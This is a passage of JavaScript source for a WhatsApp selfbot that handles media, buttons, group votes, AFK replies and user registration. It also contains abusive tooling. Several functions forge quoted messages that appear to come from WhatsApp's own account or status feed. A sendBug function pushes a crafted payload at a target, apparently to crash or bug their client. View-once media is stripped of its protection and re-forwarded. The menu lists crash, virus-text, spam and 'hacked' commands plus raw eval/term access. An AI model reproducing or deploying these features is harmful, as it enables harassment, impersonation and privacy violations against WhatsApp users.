                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      xeon.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      xeon.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      xeon.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
xeon.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		xeon.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("done");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            xeon.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    xeon.sendMessage(from, teks, text, {quoted: fkontak })
}          /*if (!mek.key.fromMe && banChats === false) return*/
	              
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
        
   
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "FakeReply Bang", //Kasih namalu
            description: "jack",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "𝙿𝙴𝙿𝙴 𝚂𝙸𝚁",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        xeon.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
xeon.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xeon.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
xeon.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await xeon.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xeon.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xeon.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
xeon.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        xeon.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      xeon.groupAdd(from, orangnya);
    };
        const grupinv = (teks) => {
        	grup = xeon.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `jack Bot Ofc.`, "footerText": "*_𝙿𝙴𝙿𝙴 𝚂𝙸𝚁_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
            xeon.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            xeon.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./stik/thumb.jpeg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`𝙿𝙴𝙿𝙴 𝚂𝙸𝚁 😎`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
// Katalog
const reply = (teks) => {
             res = xeon.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 111119999, "message": teks, "footerText": "*jack*", "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:ftrol})
             xeon.relayWAMessage(res)
        }
const fakewa = (teks) => {        
xeon.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `jack`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/918943082947?text=hello`}}})
		}
const replyfakelink = (teks) => {
xeon.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp-BOT\n𝙿𝙴𝙿𝙴 𝚂𝙸𝚁😎. (@nnda.krnwn_) •Instagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : fgif})
};
const replywa = (teks) => {
xeon.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/918943082947`,
                "mediaType": "10",
                "mediaUrl": `wa.me/918943082947`,
                "thumbnailUrl": "https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/918943082947`,
},mentionedJid:[sender]}, quoted : mek})
};
const fakeyt = (teks) => {
xeon.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `Hello ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg",
"mediaUrl": "https://youtube.com/channel/UCvAo9TZ0Pw9vrJ_0WYRyO3A",
"thumbnail": fs.readFileSync('./stik/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await xeon.relayWAMessage(
        xeon.prepareMessageFromContent(
          target,
          xeon.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      xeon.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        xeon.sendMessage(
          mek.key.remoteJid,
          `@${owner} Currently Offline!\n\n*Reason :* ${alasan}\n*Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Seconds ago\n\nPlease contact again later`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  xeon.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Currently Offline!\n\n *Reason :* ${alasan}\n *Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Seconds ago\n\nPlease contact again later`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return xeon.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "918943082947@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " You have voted",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Reason*: ${_votes[0].reason}\n*Number of Votes* : ${vote.length} Vote\n*Duration* : ${_votes[0].durasi} Minute\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "918943082947@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " You have voted",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Reason*: ${_votes[0].reason}\n*Number of Votes* : ${vote.length} Vote\n*Duration* : ${_votes[0].durasi} Minute\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      xeon.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! SORRY YOU WILL BE KICKED ;V");
        xeon.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Detected sending image/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      xeon.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} send message hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Detected sending hidetag messages!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("free admin");
        reply("ANTIVIRTEX DETECTED!! SORRY YOU WILL BE KICKED ;V");
        xeon.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        xeon.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("91")) {
        reply("GRUP ONLY +91!");
        xeon.groupRemove(from, [sender]);
      }
    }
    // Runtime Di Bio Bang🌿\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await xeon.setStatus(`Bot Mode On Since ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!mek.key.fromMe && banChats === true) return;
switch (command) {
case 'verify':
              
if (isRegistered) return reply('Your account is verified')
const serialUser = createSerial(18)
	         try {
								ppimg = await xeon.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const anuu = `「 *USER REGISTRATION* 」
*Thank you for registering in the 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁😎 Database*

▢ *ɴᴀᴍᴇ :* ${pushname}
▢ *ᴀᴘɪ :* +${sender.split('@')[0]}
▢ *sᴇʀɪᴀʟ :* ${serialUser}
▢ *ᴛᴏᴛᴀʟ :* ${_registered.length} User

*「 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁 」*`
         haitod = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
             buttons = [{buttonId: `menu`,buttonText:{displayText: `</️MENU`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(haitod, "imageMessage", { thumbnail: haitod, })).imageMessage
              buttonsMessage = {footerText:'ᴘᴇᴘᴇ', imageMessage: imageMsg,
              contentText:`${anuu}`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fkontak})
              xeon.relayWAMessage(prep)
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
            setTimeout( () => {
			xeon.updatePresence(from, Presence.composing)
			reply(`*Thank you for being registered 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁*`)
		}, 2000)
        break
      
case 'help':
case 'menu':
groups = xeon.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = xeon.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await xeon.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
       txtt =` ▢ 𝐇𝐢 ${pushname} \n ▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : ${groups.length} \n ▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : ${privat.length}\n ▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : ${totalChat.length} \n ▢ 𝐒𝐩𝐞𝐞𝐝 : ${latensie.toFixed(4)} _Second_ \n ▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : ${runtime(process.uptime())} \n ▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : ${os.platform()}`

               buttons = [{buttonId:`allmenu`, 
               buttonText:{displayText: 'MENU'},type:1},
               {buttonId:`owner`,buttonText:{displayText:'CREATOR'},type:1},
               {buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1}]


               imageMsg = (await xeon.prepareMessageMedia(fs.readFileSync(`./stik/oksip.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/oksip.jpeg`)})).imageMessage

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: `𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fkontak})
               xeon.relayWAMessage(prep)
             
               break

        case 'allmenu':
        case 'jack':
groups = xeon.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = xeon.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await xeon.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "918943082947@s.whatsapp.net"
        dtod = '918943082947'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await xeon.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `
╭────────────────╮
│▢ 𝐇𝐢 @${sender.split("@")[0]}
│▢︎ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : ${groups.length} 
│▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : ${privat.length}
│▢︎ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : ${totalChat.length}
│▢︎ 𝐒𝐩𝐞𝐞𝐝 : ${latensie.toFixed(4)} _Second_
│︎▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : ${runtime(process.uptime())}
│▢︎ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : ${os.platform()}
╰────────────────╯
${readmore}
 
  ❑ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs
╭──────────────── 
│ ⬡ ${prefix}off
│ ⬡ ${prefix}isbaileys
│ ⬡ ${prefix}banchat
│ ⬡ ${prefix}unbanchat
│ ⬡ ${prefix}listbc
│ ⬡ ${prefix}setcmd
│ ⬡ ${prefix}delcmd
│ ⬡ ${prefix}listcmd
│ ⬡ ${prefix}restart
│ ⬡ ${prefix}antidelete on|off
│ ⬡ ${prefix}autotype on|off
│ ⬡ ${prefix}autoread gc in / gc off
│ ⬡ ${prefix}autovn on|off
│ ⬡ ${prefix}anticall on|off
│ ⬡ ${prefix}getcaption
│ ⬡ ${prefix}bugcatalog
│ ⬡ ${prefix}buggc id grup
│ ⬡ ${prefix}okvirtex
│ ⬡ ${prefix}on
│ ⬡ ${prefix}status
│ ⬡ ${prefix}setthumb
│ ⬡ ${prefix}settarget
│ ⬡ ${prefix}setfakeimg
│ ⬡ ${prefix}setreply
│ ⬡ ${prefix}hacked name
│ ⬡ ${prefix}setprefix
│ ⬡ ${prefix}mode /public-self/
│ ⬡ ${prefix}term <code│
│ ⬡ ${prefix}eval <code>
│ ⬡ ${prefix}colongsw reply
╰──────────────── 

 ❑ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs
╭──────────────── 
│ ⬡ ${prefix}grup 
│ ⬡ ${prefix}promote 
│ ⬡ ${prefix}demote 
│ ⬡ ${prefix}setdesc
│ ⬡ ${prefix}setname
│ ⬡ ${prefix}nsfw 1/0
│ ⬡ ${prefix}kick 
│ ⬡ ${prefix}add 
│ ⬡ ${prefix}getbio
│ ⬡ ${prefix}getname 
│ ⬡ ${prefix}reminder 
│ ⬡ ${prefix}listonline
│ ⬡ ${prefix}sider reply
│ ⬡ ${prefix}antilink on|off
│ ⬡ ${prefix}tod
│ ⬡ ${prefix}tospam amount
│ ⬡ ${prefix}antihidetag on|off
│ ⬡ ${prefix}antivirtex on|off
│ ⬡ ${prefix}autojoin on|off
│ ⬡ ${prefix}kickarea
╰────────────────  

 ❑ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs
╭──────────────── 
│ ⬡ ${prefix}ping
│ ⬡ ${prefix}alive
│ ⬡ ${prefix}status
│ ⬡ ${prefix}inspect
│ ⬡ ${prefix}join
│ ⬡ ${prefix}dice
│ ⬡ ${prefix}numbers [number]
│ ⬡ ${prefix}quote
│ ⬡ ${prefix}write text
│ ⬡ ${prefix}writeleft text
│ ⬡ ${prefix}folioleft text
│ ⬡ ${prefix}folioright text
│ ⬡ ${prefix}ss link web
│ ⬡ ${prefix}songlyrics <query>
│ ⬡ ${prefix}namemeaning <name>
│ ⬡ ${prefix}debug
│ ⬡ ${prefix}loli 
│ ⬡ ${prefix}debug2
│ ⬡ ${prefix}infoearthquake
│ ⬡ ${prefix}recipes
│ ⬡ ${prefix}chat 91|P
│ ⬡ ${prefix}searchmessage <query>
│ ⬡ ${prefix}get url
│ ⬡ ${prefix}githubstalk <query>
│ ⬡ ${prefix}ytsearch <query>
│ ⬡ ${prefix}igstalk <query>
